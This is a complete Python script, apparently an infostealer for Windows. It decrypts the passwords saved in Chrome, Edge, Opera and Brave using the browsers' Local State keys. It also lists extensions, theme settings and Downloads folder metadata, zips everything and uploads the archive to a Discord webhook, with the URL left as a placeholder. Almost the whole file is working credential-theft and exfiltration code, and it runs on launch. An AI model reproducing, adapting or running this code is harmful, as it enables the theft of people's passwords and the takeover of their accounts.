import os
import sqlite3
import shutil
import base64
import json
import socket
import win32crypt
import requests
from pathlib import Path
from Cryptodome.Cipher import AES
import zipfile
import time

# Function to get browser extensions (Chrome, Edge, Brave, Opera)
def get_browser_extensions():
    browsers = ["chrome", "edge", "brave", "opera"]
    all_extensions = []
    for browser in browsers:
        extensions = []
        username = os.getlogin()

        if browser == "chrome":
            extensions_dir = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions"
        elif browser == "edge":
            extensions_dir = f"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Extensions"
        elif browser == "brave":
            extensions_dir = f"C:\\Users\\{username}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Extensions"
        elif browser == "opera":
            extensions_dir = f"C:\\Users\\{username}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Extensions"
        else:
            print(f"{browser} not supported!")
            continue

        if os.path.exists(extensions_dir):
            for extension_id in os.listdir(extensions_dir):
                extension_dir = os.path.join(extensions_dir, extension_id)
                if os.path.exists(extension_dir):
                    manifest_file = os.path.join(extension_dir, 'manifest.json')
                    if os.path.exists(manifest_file):
                        with open(manifest_file, 'r', encoding='utf-8') as f:
                            manifest = json.load(f)
                            extensions.append({
                                'browser': browser,
                                'id': extension_id,
                                'name': manifest.get('name', 'Unknown'),
                                'version': manifest.get('version', 'Unknown')
                            })
        all_extensions.extend(extensions)
    return all_extensions

# Function to get browser theme mode
def get_browser_theme_mode():
    browsers = ["chrome", "edge"]
    theme_modes = {}
    for browser in browsers:
        username = os.getlogin()
        theme_mode = "Unknown"
        if browser == "chrome":
            prefs_file = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Preferences"
        elif browser == "edge":
            prefs_file = f"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences"
        else:
            continue
        
        if os.path.exists(prefs_file):
            with open(prefs_file, 'r', encoding='utf-8') as f:
                prefs = json.load(f)
                theme_mode = prefs.get('profile', {}).get('theme', 'Unknown')
        
        theme_modes[browser] = theme_mode
    return theme_modes



# Grab passwords from browser storage
def get_browser_passwords():
    browsers = ["chrome", "edge", "opera", "brave"]
    all_passwords = []
    for browser in browsers:
        username = os.getlogin()
        login_data_path = None
        local_state_path = None
        
        if browser == "chrome":
            login_data_path = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
            local_state_path = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
        elif browser == "edge":
            login_data_path = f"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"
            local_state_path = f"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State"
        elif browser == "opera":
            login_data_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data"
            local_state_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State"
        elif browser == "brave":
            login_data_path = f"C:\\Users\\{username}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"
            local_state_path = f"C:\\Users\\{username}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State"

        if login_data_path and os.path.exists(login_data_path) and os.path.exists(local_state_path):
            temp_file = os.path.join(os.getenv('TEMP'), 'Login Data')
            shutil.copy2(login_data_path, temp_file)

            decryption_key = get_decryption_key(local_state_path)
            if decryption_key is None:
                print(f"Failed to extract decryption key for {browser}.")
                continue

            conn = sqlite3.connect(temp_file)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            credentials = []
            
            for row in cursor.fetchall():
                origin_url = row[0]
                username_value = row[1]
                encrypted_password = row[2]
                if encrypted_password:
                    password = decrypt_password(decryption_key, encrypted_password)
                    if password:
                        credentials.append({
                            'browser': browser,
                            'url': origin_url,
                            'username': username_value,
                            'password': password
                        })
            conn.close()
            os.remove(temp_file)
            all_passwords.extend(credentials)
    return all_passwords

# Function to extract the decryption key from the browser's local state
def get_decryption_key(local_state_path):
    try:
        with open(local_state_path, 'r', encoding='utf-8') as file:
            local_state = json.load(file)
        
        encrypted_key = local_state.get('os_crypt', {}).get('encrypted_key')
        if not encrypted_key:
            print("No encrypted key found in Local State.")
            return None
        
        encrypted_key = base64.b64decode(encrypted_key)[5:]
        decryption_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decryption_key

    except Exception as e:
        print(f"Error extracting decryption key: {str(e)}")
        return None

# Function to decrypt passwords
def decrypt_password(decryption_key, encrypted_password):
    try:
        encrypted_data = encrypted_password[3:]
        nonce = encrypted_data[:12]
        ciphertext = encrypted_data[12:-16]
        auth_tag = encrypted_data[-16:]
        cipher = AES.new(decryption_key, AES.MODE_GCM, nonce=nonce)
        decrypted_password = cipher.decrypt_and_verify(ciphertext, auth_tag)
        return decrypted_password.decode()
    except Exception as e:
        print(f"Error during password decryption: {str(e)}")
        return None

# Function to grab files' metadata from Downloads folder
def get_downloads_info():
    downloads_folder = os.path.join(os.path.expanduser('~'), 'Downloads')
    file_info = []
    if os.path.exists(downloads_folder):
        for filename in os.listdir(downloads_folder):
            file_path = os.path.join(downloads_folder, filename)
            if os.path.isfile(file_path):
                stats = os.stat(file_path)
                file_info.append({
                    'filename': filename,
                    'size': stats.st_size,
                    'created': time.ctime(stats.st_ctime),
                    'modified': time.ctime(stats.st_mtime)
                })
    return file_info

# Function to send the file to a Discord webhook with an embed
def send_to_webhook(file_path):
    webhook_url = "Put URL here"
    


    # Send the embed along with the file
    with open(file_path, 'rb') as f:
        files = {'file': (file_path, f, 'application/zip')}
        response = requests.post(webhook_url, files=files)

        if response.status_code == 200:
            print("File and embed uploaded successfully.")
            print(f"File URL: {response.json()['attachments'][0]['url']}")
        else:
            print(f"Failed to upload file. Status code: {response.status_code}")
            print(response.text)

# Main function to gather and send the information
def save_and_send_info(delete_after_send=True):
    extensions = get_browser_extensions()
    theme_modes = get_browser_theme_mode()
    passwords = get_browser_passwords()
    file_info = get_downloads_info()

    # Write the gathered information to text files
    with open("extensions.txt", "w", encoding="utf-8") as file:
        for ext in extensions:
            file.write(f"Browser: {ext['browser']}\n")
            file.write(f"Extension Name: {ext['name']}\n")
            file.write(f"Extension ID: {ext['id']}\n")
            file.write(f"Version: {ext['version']}\n")
            file.write("=" * 50 + "\n")

    with open("theme_mode.txt", "w", encoding="utf-8") as file:
        for browser, mode in theme_modes.items():
            file.write(f"Browser: {browser}\n")
            file.write(f"Theme Mode: {mode}\n")
            file.write("=" * 50 + "\n")

    with open("passwords.txt", "w", encoding="utf-8") as file:
        for password in passwords:
            file.write(f"Browser: {password['browser']}\n")
            file.write(f"URL: {password['url']}\n")
            file.write(f"Username: {password['username']}\n")
            file.write(f"Password: {password['password']}\n")
            file.write("=" * 50 + "\n")

    with open("downloads_info.txt", "w", encoding="utf-8") as file:
        for file_data in file_info:
            file.write(f"Filename: {file_data['filename']}\n")
            file.write(f"Size: {file_data['size']} bytes\n")
            file.write(f"Created: {file_data['created']}\n")
            file.write(f"Modified: {file_data['modified']}\n")
            file.write("=" * 50 + "\n")

    # Create a zip file containing all the information
    zip_filename = "data.zip"
    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.write("extensions.txt")
        zipf.write("theme_mode.txt")
        zipf.write("passwords.txt")
        zipf.write("downloads_info.txt")

    send_to_webhook(zip_filename)

    # Ask the user if they want to keep the zip file
    keep_zip = input("Do you want to keep the zip file? (y/n): ").strip().lower()
    if keep_zip != 'y':
        os.remove(zip_filename)

    # Clean up temporary text files
    if delete_after_send:
        os.remove("extensions.txt")
        os.remove("theme_mode.txt")
        os.remove("passwords.txt")
        os.remove("downloads_info.txt")

save_and_send_info(delete_after_send=False)
